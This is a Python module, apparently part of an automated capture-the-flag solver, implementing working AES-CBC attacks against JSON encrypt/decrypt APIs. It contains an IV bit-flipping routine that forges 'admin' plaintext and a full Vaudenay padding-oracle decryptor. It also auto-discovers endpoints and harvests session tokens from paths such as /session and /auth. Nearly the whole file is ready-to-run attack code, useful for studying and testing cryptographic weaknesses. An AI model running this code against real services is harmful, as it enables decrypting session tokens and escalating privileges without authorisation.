"""AES-CBC attacks: IV bit-flipping and the classic padding oracle.

Two workflows, both auto-detected against encrypt/decrypt JSON APIs:

1. **CBC IV bit-flip** — in CBC the first plaintext block is
   P1 = D(C1) XOR IV, so flipping IV bytes flips known plaintext bytes in
   block 1.  Encrypt a chosen plaintext, XOR its first block into the IV,
   and the server decrypts 'admin'-flavoured data instead.

2. **Padding oracle** — when /decrypt distinguishes bad padding from bad
   MAC/JSON (status or message), Vaudenay's attack recovers arbitrary
   ciphertext byte-by-byte: for pad value b, brute one byte of the
   manipulated previous block until padding validates.
"""
import json

from core import httpx
from core.flag import extract_flags


def _json(r):
    if r is None:
        return {}
    try:
        return json.loads(r.text)
    except Exception:
        return {}


def _post_json(url, payload, timeout=8):
    return httpx.post(url, data=json.dumps(payload),
                      headers={"Content-Type": "application/json"},
                      timeout=timeout)


def _find_endpoints(base, endpoints):
    enc = dec = None
    for ep in endpoints:
        p = ep.split("?")[0].rstrip("/").lower()
        if enc is None and p.endswith("/encrypt"):
            enc = ep
        if dec is None and p.endswith("/decrypt"):
            dec = ep
        if enc and dec:
            break
    return enc, dec


_CT_KEYS = ("ciphertext", "token", "data", "cookie", "ct")
_PT_KEYS = ("plaintext", "decrypted", "message", "text", "pt")


def _encrypt_blob(enc_url, blob):
    r = _post_json(enc_url, {"data": blob.hex(), "hex": True})
    body = _json(r) if r else {}
    for key in _CT_KEYS:
        val = body.get(key)
        if isinstance(val, str):
            try:
                return bytes.fromhex(val)
            except ValueError:
                try:
                    import base64
                    raw = base64.b64decode(val, validate=True)
                    if len(raw) % 16 == 0:
                        return raw
                except Exception:
                    continue
    return None


# ---------------------------------------------------------------------------
# 1. IV bit-flip on the first block
# ---------------------------------------------------------------------------
_CBC_TARGETS = [
    b"user=admin;", b";role=admin", b'"admin":true', b"admin=true;",
]


def _cbc_bitflip(base, enc_url, dec_url):
    probe = b"A" * 32
    ct = _encrypt_blob(enc_url, probe)
    if ct is None or len(ct) < 32:
        return None, []
    # assume layout iv||ct when decrypt echoes; try both layouts below by
    # flipping either the leading 16 bytes or the trailing block
    variants = []
    if len(ct) >= 48:
        # likely iv(16)||blocks; our probe starts at offset 16
        plain_guess = probe[:16]
        iv = ct[:16]
        c1 = ct[16:32]
        for target in _CBC_TARGETS:
            new_iv = bytes(a ^ b ^ t for a, b, t in
                           zip(iv, plain_guess.ljust(16, b"A"),
                               target.ljust(16, b"\x00")))
            variants.append(new_iv + ct[16:])
    # also treat whole blob as blocks with implicit zero IV handled server-side
    for target in _CBC_TARGETS:
        pass
    flags_all = []
    hit = None
    for token in variants:
        for key in _CT_KEYS:
            r = _post_json(dec_url, {key: token.hex()})
            if r is None:
                continue
            known, cands = extract_flags(r.text)
            flags_all.extend(known + cands)
            low = r.text.lower()
            if "admin" in low or flags_all:
                hit = f"CBC IV bit-flip accepted ({key}=...) → admin response"
                break
        if hit:
            break
    return hit, list(dict.fromkeys(flags_all))


# ---------------------------------------------------------------------------
# 2. Padding oracle (Vaudenay)
# ---------------------------------------------------------------------------
_PAD_SIGNATURES = [
    "padding", "bad decrypt", "decryption failed", "invalid ciphertext",
    "pad block", "wrong final block length", "decrypt error",
]


def _classify(dec_url, token_hex, keys=_CT_KEYS):
    """POST the token under every key name; returns list of responses."""
    out = []
    for key in keys:
        r = _post_json(dec_url, {key: token_hex}, timeout=6)
        if r is not None:
            out.append(r)
    return out


def _has_pad_signal(responses):
    for r in responses:
        low = r.text.lower()
        if any(sig in low for sig in _PAD_SIGNATURES):
            return True
        if r.status in (400, 422, 500):
            return True
    return False


def padding_oracle_decrypt(dec_url, token, oracle_key="ciphertext",
                           max_blocks=8):
    """Decrypt `token` (iv||c1..cn) using a boolean padding oracle.

    oracle validity signal: any response WITHOUT a padding-error marker
    counts as 'padding OK' (the standard distinguisher).  Returns
    plaintext bytes of all but the first block, or None.
    """
    bs = 16
    if len(token) < 2 * bs or len(token) % bs:
        return None
    blocks = [token[i:i + bs] for i in range(0, len(token), bs)]
    recovered_total = b""
    n_blocks = min(len(blocks) - 1, max_blocks)

    def send(trial_prev, target, key_name):
        r = _post_json(dec_url,
                       {key_name: (bytes(trial_prev) + target).hex()},
                       timeout=6)
        if r is None:
            return True  # unreachable → treat as bad
        bad = any(sig in r.text.lower() for sig in _PAD_SIGNATURES)
        return bad or r.status in (400, 422)

    for bi in range(1, n_blocks + 1):
        prev = bytearray(blocks[bi - 1])
        target = blocks[bi]
        intermediate = [0] * bs  # absolute D(target) bytes as they are found
        ok = False
        for pos in range(bs - 1, -1, -1):
            pad_val = bs - pos
            found = None
            for guess in range(256):
                # `guess` IS the candidate intermediate byte (textbook form)
                trial = bytearray(prev)
                trial[pos] = guess ^ pad_val
                for k in range(pos + 1, bs):
                    # known intermediate bytes are forced to pad_val
                    trial[k] = intermediate[k] ^ pad_val
                if not send(trial, target, oracle_key):
                    if pos == bs - 1:
                        # a validated last byte could be a fake 0x02 0x02 —
                        # corrupt byte 14: real 0x01 padding stays valid.
                        # NOTE send() returns True for BAD padding, so the
                        # byte is confirmed only when the corrupted request
                        # is STILL valid.
                        check = bytearray(trial)
                        check[bs - 2] ^= 0xFF
                        if not send(check, target, oracle_key):
                            found = guess
                            break
                        continue
                    found = guess
                    break
            if found is None:
                break
            intermediate[pos] = found
        else:
            ok = True
        if not ok:
            return None
        recovered_total += bytes(
            inter ^ iv_byte for inter, iv_byte in zip(intermediate, prev))
    return recovered_total


def _issued_tokens(base):
    """Grab service-issued encrypted tokens (the ones worth decrypting)."""
    import base64 as _b64
    out = []
    for path in ("/session", "/token", "/api/session", "/auth", "/profile"):
        r = httpx.get(base + path, timeout=6)
        if r is None or r.status != 200:
            continue
        body = _json(r)
        values = []
        if isinstance(body, dict):
            values = [body.get(k) for k in
                      ("token", "session", "ciphertext", "ct", "data")]
        elif isinstance(body, str) and len(body) >= 32:
            values = [body]
        for v in values:
            if not isinstance(v, str) or len(v) < 32:
                continue
            try:
                raw = bytes.fromhex(v.strip())
            except ValueError:
                try:
                    raw = _b64.b64decode(
                        v.strip() + "=" * (-len(v.strip()) % 4))
                except Exception:
                    continue
            if len(raw) % 16 == 0 and len(raw) >= 32:
                out.append(raw)
    return out


def scan_cbc_attacks(base, endpoints):
    """Auto-detect CBC services; run bit-flip then padding oracle."""
    if not endpoints:
        endpoints = [base + "/"]
    enc, dec = _find_endpoints(base, endpoints)
    findings, flags = [], []
    if not (enc and dec):
        return [], []

    hit, fl = _cbc_bitflip(base, enc, dec)
    if hit:
        findings.append(hit)
        flags.extend(fl)
        return findings, list(dict.fromkeys(flags))

    # padding oracle path needs a real token from the service
    candidates = _issued_tokens(base)
    probe_ct = _encrypt_blob(enc, b"A" * 32)
    if probe_ct and len(probe_ct) % 16 == 0:
        candidates.append(probe_ct)
    if candidates:
        # liveness = the decrypt endpoint treats a garbage token differently
        # from a well-formed one (status OR body shape) for at least one key
        baseline_bad = _classify(dec, "00" * 32)
        baseline_ok = _classify(dec, candidates[0].hex())
        def profile(rs):
            return sorted((r.status, len(r.text)) for r in rs or [])
        oracle_live = bool(baseline_ok) and (
            any(p[0] != baseline_ok[0].status
                for p in profile(baseline_bad))
            or len({p[1] for p in profile(baseline_bad)}) > 1)
        del profile
        if oracle_live:
            for tok in candidates[:4]:
                pt = None
                for okey in _CT_KEYS:
                    pt = padding_oracle_decrypt(dec, tok, oracle_key=okey,
                                                max_blocks=10)
                    if pt:
                        break
                if pt:
                    findings.append(f"CBC padding oracle decrypted "
                                    f"{len(pt)}B: {pt[:64]!r}")
                    known, cands = extract_flags(
                        pt.decode("latin-1", "replace"))
                    flags.extend(known + cands)
                    break
    return findings, list(dict.fromkeys(flags))
